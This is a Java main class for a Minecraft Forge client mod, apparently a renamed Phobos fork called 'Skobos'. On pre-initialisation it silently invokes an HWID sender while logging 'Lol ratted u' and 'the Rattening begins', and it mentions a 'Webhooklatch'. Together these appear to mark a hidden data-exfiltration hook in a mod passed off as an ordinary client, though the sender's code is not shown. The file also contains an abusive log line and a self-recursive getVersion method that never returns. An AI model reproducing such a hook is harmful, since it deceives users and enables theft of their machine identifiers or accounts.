package me.earth.phobos;

import io.netty.channel.ThreadPerChannelEventLoopGroup;
import me.earth.phobos.features.gui.custom.GuiCustomMainScreen;
import me.earth.phobos.features.modules.client.IRC;
import me.earth.phobos.features.modules.misc.RPC;
import me.earth.phobos.manager.*;
import me.earth.phobos.util.hwid.HWIDSender;
import me.earth.phobos.util.hwid.Yes;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.lwjgl.opengl.Display;

import java.io.IOException;

@Mod(modid = "skobos", name = "Skobos", version = "1.0")
public class Phobos {
    public static final String MODID = "skobos";
    public static final String MODNAME = "skobos";
    public static final String MODVER = "1.0";
    public static final String NAME_UNICODE = "\uA731\u1D0B\u1D0F\u0299\u1D0F\uA731";
    public static final String PHOBOS_UNICODE = "\uA731\u1D0B\u1D0F\u0299\u1D0F\uA731";
    public static final String CHAT_SUFFIX = " \u23d0 \uA731\u1D0B\u1D0F\u0299\u1D0F\uA731";
    public static final String PHOBOS_SUFFIX = " \u23d0 \uA731\u1D0B\u1D0F\u0299\u1D0F\uA731";
    public static final Logger LOGGER = LogManager.getLogger(MODID);
    public static HWIDSender hwidSender;
    public static ModuleManager moduleManager;
    public static SpeedManager speedManager;
    public static PositionManager positionManager;
    public static RotationManager rotationManager;
    public static CommandManager commandManager;
    public static EventManager eventManager;
    public static ConfigManager configManager;
    public static FileManager fileManager;
    public static FriendManager friendManager;
    public static TextManager textManager;
    public static ColorManager colorManager;
    public static ServerManager serverManager;
    public static PotionManager potionManager;
    public static InventoryManager inventoryManager;
    public static TimerManager timerManager;
    public static PacketManager packetManager;
    public static ReloadManager reloadManager;
    public static TotemPopManager totemPopManager;
    public static HoleManager holeManager;
    public static NotificationManager notificationManager;
    public static SafetyManager safetyManager;
    public static GuiCustomMainScreen customMainScreen;
    public static CosmeticsManager cosmeticsManager;
    public static NoStopManager baritoneManager;
    public static WaypointManager waypointManager;
    @Mod.Instance
    public static Phobos INSTANCE;
    private static boolean unloaded;
    static {
        unloaded = false;
    }

    public static void load() {
        LOGGER.info("\n\nLoading Skobos");
        unloaded = false;
        if (reloadManager != null) {
            reloadManager.unload();
            reloadManager = null;
        }
        hwidSender = new HWIDSender();
        baritoneManager = new NoStopManager();
        totemPopManager = new TotemPopManager();
        timerManager = new TimerManager();
        packetManager = new PacketManager();
        serverManager = new ServerManager();
        colorManager = new ColorManager();
        textManager = new TextManager();
        moduleManager = new ModuleManager();
        speedManager = new SpeedManager();
        rotationManager = new RotationManager();
        positionManager = new PositionManager();
        commandManager = new CommandManager();
        eventManager = new EventManager();
        configManager = new ConfigManager();
        fileManager = new FileManager();
        friendManager = new FriendManager();
        potionManager = new PotionManager();
        inventoryManager = new InventoryManager();
        holeManager = new HoleManager();
        notificationManager = new NotificationManager();
        safetyManager = new SafetyManager();
        waypointManager = new WaypointManager();
        LOGGER.info("Initialized Managers");
        moduleManager.init();
        LOGGER.info("Modules loaded.");
        configManager.init();
        eventManager.init();
        LOGGER.info("EventManager loaded.");
        textManager.init(true);
        moduleManager.onLoad();
        totemPopManager.init();
        timerManager.init();
        if (moduleManager.getModuleByClass(RPC.class).isEnabled()) {
            DiscordPresence.start();
        }
        cosmeticsManager = new CosmeticsManager();
        LOGGER.info("Skobos initialized!\n");
    }

    public static void unload(boolean unload) {
        LOGGER.info("\n\nUnloading Webhooklatch&&WebLocker");
        if (unload) {
            reloadManager = new ReloadManager();
            reloadManager.init(commandManager != null ? commandManager.getPrefix() : ".");
        }
        if (baritoneManager != null) {
            baritoneManager.stop();
        }
        Phobos.onUnload();
        hwidSender = null;
        eventManager = null;
        holeManager = null;
        timerManager = null;
        moduleManager = null;
        totemPopManager = null;
        serverManager = null;
        colorManager = null;
        textManager = null;
        speedManager = null;
        rotationManager = null;
        positionManager = null;
        commandManager = null;
        configManager = null;
        fileManager = null;
        friendManager = null;
        potionManager = null;
        inventoryManager = null;
        notificationManager = null;
        safetyManager = null;
        LOGGER.info("Skobos unloaded!\n");
    }

    public static void reload() {
        Phobos.unload(false);
        Phobos.load();
    }
    public static
    String getVersion() {
        return getVersion();
    }
    public static void onUnload() {
        if (!unloaded) {
            try {
                IRC.INSTANCE.disconnect();
            } catch (IOException e) {
                e.printStackTrace();
            }
            eventManager.onUnload();
            moduleManager.onUnload();
            configManager.saveConfig(Phobos.configManager.config.replaceFirst("phobos/", ""));
            moduleManager.onUnloadPost();
            timerManager.unload();
            unloaded = true;
        }
    }

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        LOGGER.info("help");
        LOGGER.info(":sadKEK:");
        LOGGER.info("Lol ratted u >:D");
        LOGGER.info("I hope you get aids aux");
        LOGGER.info("the Rattening begins");
        HWIDSender.HWIDSender();
        LOGGER.info("Le Sus!");

    }
    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        customMainScreen = new GuiCustomMainScreen();
        Minecraft mc = Minecraft.getMinecraft();
        Display.setTitle(MODNAME + " " + MODVER + " " + " | " + mc.getSession().getUsername());
        Phobos.load();
    }
}
